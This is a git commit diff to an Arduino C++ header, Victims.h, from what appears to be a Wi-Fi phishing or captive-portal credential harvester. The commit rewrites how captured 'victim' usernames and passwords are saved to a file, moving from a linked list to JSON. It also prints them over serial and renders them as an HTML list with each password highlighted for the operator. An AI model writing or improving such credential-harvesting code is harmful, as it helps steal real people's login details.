66568e19ca0d637d5f9b5eb983186008195f6486
= <=>
2025-03-05 23:53:56 -0300

    estrutura de dados em json

--- src/Victims.h
+++ src/Victims.h
@@ -1,75 +1,32 @@
 #include <Arduino.h>
+#include <ArduinoJson.h>
 #include "Arquivomaneger.h"
 using namespace std;
 
 
-struct Victim{
-    string username;
-    string password;
-};
-
-
-struct No{
-    Victim victim;
-    No* prox_no;
-};
-
-
 class Victims {
 private:
-    No* ptr_no_cabeca;
     Arquivomaneger* arquivo;
+    JsonDocument doc;   
 
-    const char SEPARATE_VICTIMS = '\n';
-    const char SEPARATE_INFO_VICTIMS = '\t';
-
-
-    void adicionarNovoNo(Victim victim){
-        No* ptr_novo_no;
-        ptr_novo_no = new No;
-        ptr_novo_no->victim = victim;
-        ptr_novo_no->prox_no = NULL;
-
-        if(ptr_no_cabeca != NULL){
-            ptr_novo_no->prox_no = ptr_no_cabeca;
-        }
-
-        ptr_no_cabeca = ptr_novo_no;
-    }
 public:
 
     Victims(){
-        ptr_no_cabeca = NULL;
-
         arquivo = new Arquivomaneger("/victims.txt");
-        string victimsFullText = arquivo->readFile().c_str();
-
-        Serial.println(victimsFullText.c_str());
-        
-        int res = -1, oldRes = 0;
-        while ((res = victimsFullText.find(SEPARATE_VICTIMS, res + 1)) != string::npos){
-            Victim victim;
-            string victimFullText = victimsFullText.substr(oldRes, res);
-            int division = victimFullText.find(SEPARATE_INFO_VICTIMS);
-
-            victim.username = victimFullText.substr(0, division);
-            victim.password = victimFullText.substr(division, res);
-            
-            adicionarNovoNo(victim);
-
-            oldRes = res;
-        }
+        String victimsFullText = arquivo->readFile();
+        Serial.println(victimsFullText);
+        deserializeJson(doc, victimsFullText);
     }
 
     void addVictim(String user, String pass){
-        Victim v;
-        v.password = pass.c_str();
-        v.username = user.c_str();
-        
-        adicionarNovoNo(v);
+        JsonObject victim = doc["victims"].add<JsonObject>();
+        victim["username"] = user;
+        victim["password"] = pass;
 
-        String oldContent = arquivo->readFile();
-        arquivo->writeFile(user + SEPARATE_INFO_VICTIMS + pass + SEPARATE_VICTIMS + oldContent);
+        String out;
+        serializeJson(doc, out);
+        Serial.println(out);
+        arquivo->writeFile(out);
     }
 
     void clearVictims(){
@@ -78,19 +35,18 @@ public:
 
 
     String returnFullTextFormatted(){
-        No* ptr_no_atual;
-        ptr_no_atual = ptr_no_cabeca;
-
         string text = "";
 
-        while(ptr_no_atual != NULL){
-            text += "<li>Email:  <b>" + ptr_no_atual->victim.username + "</b></br>Password:  <b style=color:#ea5455;>" + ptr_no_atual->victim.password + "</b></li>";            
+        JsonArray victimsJson = doc["victims"].as<JsonArray>();
 
-            ptr_no_atual = ptr_no_atual->prox_no;
+        for (int i = 0; i < victimsJson.size(); i++){
+            string user = victimsJson[i]["username"];
+            string pass = victimsJson[i]["password"];
+
+            text += "<li>Email:  <b>" + user + "</b></br>Password:  <b style=color:#ea5455;>" + pass + "</b></li>";            
         }
 
         return String(text.c_str());
     }
-
-    
+  
 };
